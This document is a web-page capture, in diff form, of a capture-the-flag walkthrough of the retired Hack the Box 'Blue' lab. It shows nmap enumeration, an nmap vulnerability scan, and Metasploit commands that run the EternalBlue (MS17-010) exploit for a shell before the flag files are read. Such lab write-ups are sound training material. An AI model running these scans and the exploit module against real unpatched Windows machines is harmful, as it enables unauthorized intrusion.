@@ -1,0 +1,226 @@
+
+								
+																		Hack the Box Challenge: Blue Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 23, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Blue” which is lab presented by Hack the Box for making online penetration practices according to your experience level. They have a collection of vulnerable labs as challenges from beginners to Expert level. HTB have two partitions of lab i.e. Active and retired since we can’t submit a write-up of any Active lab, therefore, we have chosen retried Blue lab.
+Level: Beginners
+Task: find user.txt and root.txt file in the victim’s machine.
+Let’s begin the Game!!
+Since these labs are online available therefore they have static IP and IP of blue is 10.10.10.40 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 10.10.10.40 --open
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 10.10.10.40 --open
+					
+				
+			
+		
+
+From the given below image, you can observe that we found so many open ports and port 137, 139 and 445 denotes that it is a windows machine.
+
+When I extract the complete result of nmap I found the following details
+
+OS: Windows 7 professional
+Computer name: haris-pc
+NetBIOS computer name haris-pc
+SMB version: 02 
+
+Great!! Form this result I can conclude username can be “haris” moreover smb 2.02 can be exploited by the eternal blue vulnerability.
+
+Let confirm eternal blue vulnerability in the victim’s system using nmap script.
+
+		
+		
+			
+			
+			
+			
+nmap --script vuln -p445 10.10.10.40
+			
+				
+					
+				
+					1
+				
+						nmap --script vuln -p445 10.10.10.40
+					
+				
+			
+		
+
+Awesome!! Victim’s machine is vulnerable to eternal blue exploit. 
+
+Then I run the msfconsole command in terminal and load Metasploit framework for using the eternal blue module for exploiting target machine.
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/smb/ms17_010_eternalblue
+msf exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 10.10.10.40
+msf exploit(windows/smb/ms17_010_eternalblue) &gt;run
+			
+				
+					
+				
+					123
+				
+						use exploit/windows/smb/ms17_010_eternalbluemsf exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 10.10.10.40msf exploit(windows/smb/ms17_010_eternalblue) &gt;run
+					
+				
+			
+		
+
+Terrific!! I have got unauthorized access of victims command shell through session 1 as shown in below image.
+
+Inside c:\Users\haris \Desktop I found the user.txt file and used type “filename” command for reading this file.
+
+		
+		
+			
+			
+			
+			
+cd Desktop
+type user.txt
+			
+				
+					
+				
+					12
+				
+						cd Desktoptype user.txt
+					
+				
+			
+		
+
+Great!! We got our 1st flag successfully
+
+Inside c:\Users\Administrator \Desktop I found a root.txt file and used type “filename” command for reading this file.
+
+		
+		
+			
+			
+			
+			
+cd Desktop
+type root.txt
+			
+				
+					
+				
+					12
+				
+						cd Desktoptype root.txt
+					
+				
+			
+		
+
+Great!! We got our 2nd flag successfully.
+It was a very easy challenge for those candidates who have little to no knowledge of vulnerability analysis.
+Happy Hacking!! 
+
+Author: Pavandeep Singh is a Technical Writer, Researcher and Penetration Tester Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
